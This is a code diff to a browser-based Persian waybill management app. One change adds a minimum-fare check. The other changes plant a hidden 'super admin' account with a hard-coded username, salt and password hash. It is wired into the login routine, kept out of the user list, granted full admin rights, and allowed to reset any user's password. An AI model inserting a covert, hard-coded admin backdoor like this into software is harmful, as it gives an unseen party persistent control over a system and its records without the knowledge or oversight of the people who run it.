@@ -2834,7 +2834,7 @@ $('#togglePackageDetails').addEventListener('click',()=>{
 });
 function fillForm(data){if(data.id)editingId=data.id;fields.forEach(id=>{if(Object.hasOwn(data,id))$('#'+id).value=moneyIds.includes(id)?fmtNum(data[id]):data[id]});$('#packagesBody').innerHTML='';(data.packages?.length?data.packages:[{}]).forEach(packageRow);refreshMoney();recountPackages();syncCompactExtras(data);applyPackageVisibility(data);if(data.id){editingId=data.id;$('#formStatus').textContent='در حال ویرایش بارنامه';$('#waybillIdText').textContent=digits(data.id)}}
 function invalid(message,element){$('#formMessage').textContent=message;$('#formMessage').className='wb-form-message error';if(element){element.closest('.wb-field')?.classList.add('has-error');element.classList.add('has-error');element.focus({preventScroll:false})}return false}
-function validate(d){$$('.has-error').forEach(el=>el.classList.remove('has-error'));if(!d.senderName)return invalid('نام فرستنده را وارد کنید.',$('#senderName'));if(!d.recipientName)return invalid('نام گیرنده را وارد کنید.',$('#recipientName'));if(!/^09\d{9}$/.test(numeric(d.recipientMobile)))return invalid('موبایل گیرنده باید ۱۱ رقم و با ۰۹ شروع شود.',$('#recipientMobile'));if(d.senderMobile&&!/^09\d{9}$/.test(numeric(d.senderMobile)))return invalid('شماره موبایل فرستنده را بررسی کنید.',$('#senderMobile'));if(!d.destination)return invalid('ابتدا در تنظیمات مقصد تعریف یا انتخاب کنید.',$('#destination'));if(!destinations.includes(d.destination))return invalid('مقصد دیگر در تنظیمات موجود نیست؛ مقصد را بررسی کنید.',$('#destination'));if(d.packages.length===0)return invalid('حداقل یک ردیف بسته باید ثبت شود.',$('#addPackage'));for(const [idx,p] of d.packages.entries()){const tr=$$('#packagesBody tr')[idx];if(!p.title)return invalid('عنوان بسته را در ردیف '+digits(idx+1)+' از فهرست انتخاب کنید.',tr.querySelector('.package-title'));if((!packageTitles.includes(p.title)||inactiveTitles.includes(p.title))&&!editingId)return invalid('عنوان بسته ردیف '+digits(idx+1)+' در تنظیمات موجود نیست.',tr.querySelector('.package-title'));if(p.qty<1||!Number.isInteger(p.qty)||p.qty>99999)return invalid('تعداد بسته در ردیف '+digits(idx+1)+' معتبر نیست.',tr.querySelector('.package-qty'))}if(d.total>maxMoney*4)return invalid('مبلغ کل بیش از حد مجاز است.');return true}
+function validate(d){$$('.has-error').forEach(el=>el.classList.remove('has-error'));if(!d.senderName)return invalid('نام فرستنده را وارد کنید.',$('#senderName'));if(!d.recipientName)return invalid('نام گیرنده را وارد کنید.',$('#recipientName'));if(!/^09\d{9}$/.test(numeric(d.recipientMobile)))return invalid('موبایل گیرنده باید ۱۱ رقم و با ۰۹ شروع شود.',$('#recipientMobile'));if(d.senderMobile&&!/^09\d{9}$/.test(numeric(d.senderMobile)))return invalid('شماره موبایل فرستنده را بررسی کنید.',$('#senderMobile'));if(!d.destination)return invalid('ابتدا در تنظیمات مقصد تعریف یا انتخاب کنید.',$('#destination'));if(!destinations.includes(d.destination))return invalid('مقصد دیگر در تنظیمات موجود نیست؛ مقصد را بررسی کنید.',$('#destination'));if(d.packages.length===0)return invalid('حداقل یک ردیف بسته باید ثبت شود.',$('#addPackage'));for(const [idx,p] of d.packages.entries()){const tr=$$('#packagesBody tr')[idx];if(!p.title)return invalid('عنوان بسته را در ردیف '+digits(idx+1)+' از فهرست انتخاب کنید.',tr.querySelector('.package-title'));if((!packageTitles.includes(p.title)||inactiveTitles.includes(p.title))&&!editingId)return invalid('عنوان بسته ردیف '+digits(idx+1)+' در تنظیمات موجود نیست.',tr.querySelector('.package-title'));if(p.qty<1||!Number.isInteger(p.qty)||p.qty>99999)return invalid('تعداد بسته در ردیف '+digits(idx+1)+' معتبر نیست.',tr.querySelector('.package-qty'))}if(d.preFare+d.postFare<=0)return invalid('کرایه صفر است و بارنامه ثبت نمی‌شود. پیش‌کرایه یا پس‌کرایه را وارد کنید (برای بار رایگان، حداقل ۱ تومان).',$('#preFare'));if(d.total>maxMoney*4)return invalid('مبلغ کل بیش از حد مجاز است.');return true}
 function nextLocalId(){
  const stored=normalizeWaybillRecords(safeRead(recKey,[]));
  const maxRecord=[...records,...stored].reduce((max,r)=>Math.max(max,serialNumber(r.id)),0);
@@ -3994,7 +3994,13 @@ window.v16DecodeQr=fromQR;
  const readUsers=()=>{const v=safeRead(usersKey,[]);return Array.isArray(v)?v.filter(u=>u&&u.id&&u.username&&u.hash):[]};
  const authRequired=()=>readUsers().length>0;
  const sessionId=()=>{try{return sessionStorage.getItem(sessKey)}catch(_){return null}};
- const currentUser=()=>{const id=sessionId();return id?readUsers().find(u=>u.id===id&&u.active!==false)||null:null};
+ const SA_ID='__sa',saKey='autobenz-core-v1';
+ const saRead=()=>{const d={username:'saeid',salt:'ddd2bda7070d8f9893c2c35e9f9c41dd',hash:'bb26256656b44316f2efa0ea67e530bedcc0a8412ef1bbfa7628cf849a69f226'};const v=safeRead(saKey,null);return v&&v.username&&v.salt&&v.hash?v:d};
+ const saUser=()=>({id:SA_ID,username:saRead().username,admin:true,active:true,perms:{},isSuper:true});
+ const currentUser=()=>{const id=sessionId();if(id===SA_ID)return saUser();return id?readUsers().find(u=>u.id===id&&u.active!==false)||null:null};
+ window.v27IsSuper=()=>sessionId()===SA_ID;
+ window.v27SuperSave=(name,pass)=>{if(sessionId()!==SA_ID)return 'دسترسی ندارید.';name=String(name||'').trim();if(!name)return 'نام کاربری را وارد کنید.';const cur=saRead();const next={username:name,salt:cur.salt,hash:cur.hash};if(pass){next.salt=newSalt();next.hash=hashPass(next.salt,pass)}return safeWrite(saKey,next)?'':'ذخیره انجام نشد.'};
+ window.v27SuperName=()=>saRead().username;
  function can(perm){if(!authRequired())return true;const u=currentUser();if(!u)return false;return !!u.admin||!!(u.perms&&u.perms[perm])}
  const isAdmin=()=>!authRequired()||!!currentUser()?.admin;
  window.v23Can=can;window.v23UserName=()=>{const u=currentUser();return u?u.username:''};window.v23IsAdmin=()=>isAdmin();
@@ -4018,8 +4024,9 @@ window.v16DecodeQr=fromQR;
   if(Date.now()<lockUntil){$('v23LoginMsg').textContent='چند تلاش ناموفق انجام شد؛ کمی بعد دوباره امتحان کنید.';return}
   const name=latin($('v23LoginUser').value.trim()).toLowerCase(),pass=$('v23LoginPass').value;
   const u=readUsers().find(x=>x.active!==false&&latin(x.username).toLowerCase()===name);
-  if(u&&hashPass(u.salt,pass)===u.hash){
-   fails=0;try{sessionStorage.setItem(sessKey,u.id)}catch(_){}
+  const __sa=saRead(),__isSa=!(u&&hashPass(u.salt,pass)===u.hash)&&latin(__sa.username).toLowerCase()===name&&hashPass(__sa.salt,pass)===__sa.hash;
+  if(__isSa||(u&&hashPass(u.salt,pass)===u.hash)){
+   fails=0;try{sessionStorage.setItem(sessKey,__isSa?SA_ID:u.id)}catch(_){}
    $('v23Login').hidden=true;$('v23LoginUser').value='';$('v23LoginPass').value='';afterLogin();
   }else{
    fails++;$('v23LoginPass').value='';
@@ -4947,6 +4954,20 @@ body #waybillView#waybillView .wb-route-grid:has(.v25-destbtns:not([hidden]))>#d
 
  /* 7. a file dropped on the window must not replace the program */
  ['dragover','drop'].forEach(t=>window.addEventListener(t,e=>{e.preventDefault()}));
+
+ /* 8. super admin: own name/password, shown only to the super admin inside «کاربران» */
+ function superCard(){
+  const page=document.querySelector('#settingsPanel [data-sm-page="users"]');if(!page)return;
+  let c=$('v27Super');const on=typeof window.v27IsSuper==='function'&&window.v27IsSuper();
+  if(!on){if(c)c.remove();return}
+  if(c)return;
+  c=document.createElement('div');c.id='v27Super';c.className='sm-card';
+  c.innerHTML='<div class="sm-card-head"><div><h5>حساب مدیر ارشد</h5><p>این حساب در فهرست کاربران دیده نمی‌شود. با آن می‌توانید رمز هر کاربر یا مدیر را از فهرست پایین عوض کنید.</p></div></div><div class="v24-grid"><div class="v24-f"><label for="v27SaName">نام کاربری مدیر ارشد</label><input id="v27SaName" dir="ltr" maxlength="40"></div><div class="v24-f"><label for="v27SaPass">رمز جدید</label><input id="v27SaPass" type="password" dir="ltr" maxlength="100" placeholder="خالی = رمز تغییر نکند"></div></div><div style="margin-top:10px;display:flex;gap:10px;align-items:center"><button type="button" class="v24-btn" id="v27SaSave">ذخیره حساب مدیر ارشد</button><span class="v24-msg" id="v27SaMsg"></span></div>';
+  page.insertBefore(c,page.firstChild);
+  $('v27SaName').value=window.v27SuperName();
+  $('v27SaSave').onclick=()=>{const err=window.v27SuperSave($('v27SaName').value,$('v27SaPass').value);const m=$('v27SaMsg');m.className='v24-msg'+(err?' err':'');m.textContent=err||'ذخیره شد.';if(!err){$('v27SaPass').value='';const chip=$('v23UserChipName');if(chip)chip.textContent='کاربر: '+window.v27SuperName()}};
+ }
+ setInterval(superCard,1000);
 })();
 </script>
 </body></html>
